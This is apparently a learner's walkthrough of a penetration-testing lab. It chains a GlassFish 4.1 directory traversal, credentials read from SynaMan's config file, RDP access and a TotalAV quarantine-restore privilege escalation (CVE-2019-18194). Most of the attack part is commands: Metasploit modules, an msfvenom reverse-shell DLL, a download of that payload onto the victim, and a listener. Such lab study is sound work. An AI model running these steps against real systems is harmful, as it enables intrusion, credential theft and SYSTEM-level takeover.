In this lab, we will leverage a directory traversal vulnerability in Oracle GlassFish and exploit a credential disclosure in SynaMan to gain a foothold on the target system. We will then elevate our access by abusing the installed antivirus, TotalAV. This lab focuses on exploiting web application vulnerabilities and privilege escalation techniques.

Summary

This lab demonstrates leveraging a directory traversal vulnerability in Oracle GlassFish Server 4.1 to obtain sensitive configuration files, including SynaMan SMTP credentials. Learners will use these credentials to gain access via RDP. Privilege escalation is achieved by abusing the TotalAV antivirus to release a malicious DLL into a privileged directory, granting a SYSTEM shell. The lab emphasizes file inclusion attacks, credential exploitation, and abusing antivirus software for privilege escalation.

Learning Objectives

After completion of this lab, learners will be able to:

Enumerate services to identify Oracle GlassFish and SynaMan applications.
Exploit the GlassFish directory traversal vulnerability to read sensitive configuration files.
Extract credentials from SynaMan's configuration file and use them to access the target via RDP.
Create a malicious DLL payload and quarantine it using TotalAV.
Abuse TotalAV's quarantine release feature to execute the payload and gain SYSTEM access.

--

alrighty. lets get crackin


    
```
nmap -sS -sV 192.168.56.168

Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-14 22:19 +0000
Nmap scan report for 192.168.56.168
Host is up (0.00038s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE              VERSION
135/tcp  open  msrpc                Microsoft Windows RPC
139/tcp  open  netbios-ssn          Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server        Microsoft Terminal Services
4848/tcp open  http                 Sun GlassFish Open Source Edition  4.1
7676/tcp open  java-message-service Java Message Service 301
8080/tcp open  http                 Sun GlassFish Open Source Edition  4.1
8181/tcp open  intermapper?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.86 seconds
```
so, 192.168.56.168:4848 - glassfish.

https://www.exploit-db.com/exploits/45196


```bash
msconsole
use scanner/http/glassfish_traversal

set RHOSTS 192.168.56.168
set RPORT 4848

set FILEPATH /windows/win.ini
set FILEPATH /Windows/System32/drivers/etc/hosts

# well, it works...but...where are SynaMan creds?

set FILEPATH /Program Files/SynaMan/conf/credentials.xml
set FILEPATH /Program Files/SynaMan/config/credentials.xml
set FILEPATH /Program Files/SynaMan/conf/admin.xml
set FILEPATH /Program Files/SynaMan/config/admin.xml
set FILEPATH /Program Files/SynaMan/conf/credentials.xml

# this is annoying, lets automate it.
# NOPE: We probably got it.
set FILEPATH /SynaMan/config/AppConfig.xml

```

now to steal SMTP creds.

```xml
<parameter name="smtpServer" type="1" value="mail.fish.pg"></parameter>
<parameter name="smtpUser" type="1" value="arthur"></parameter>
<parameter name="smtpPassword" type="1" value="KingOfAtlantis"></parameter>
```
stolen...

let's see if RDP is open.

    rdesktop -u arthur -p KingOfAtlantis 192.168.56.168:3389
    
sick, user flag.

alright. 
TotalAV 2020 4.14.31 Privilege Escalation (CVE-2019-18194)
https://www.youtube.com/watch?v=88qeaLq98Gc

we need an msfvenom reverse shell payload to be loaded into the victim's filesystem.
  
    export ATTACKER_IP=192.168.49.56
    msfvenom -p windows/meterpreter/reverse_tcp lhost=$ATTACKER_IP lport=4444 -f dll > totalavpwn.dll
    python3 -m http.server 8888

on victim:

    cd ~
    mkdir MountPoint
    Invoke-WebRequest -Uri "http://192.168.49.56:8888/totalavpwn.dll" -OutFile "C:\users\arthur\MountPoint\version.dll"

on attacker to receive reverse shell:

    msfconsole
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set lhost 192.168.49.56
    set lport 4444
    run

then, to trigger:

1. scan folder with TotalAV and quarantine threat
2. `New-Item -ItemType Junction -Path "C:\Users\Arthur\MountPoint" -Target "C:\Windows\Microsoft.NET\Framework\v4.0.30319"`
3. restore a threat in TotalAV
4. reboot windows victim with `shutdown /r /t 0` and wait
5. enjoy reverse shell
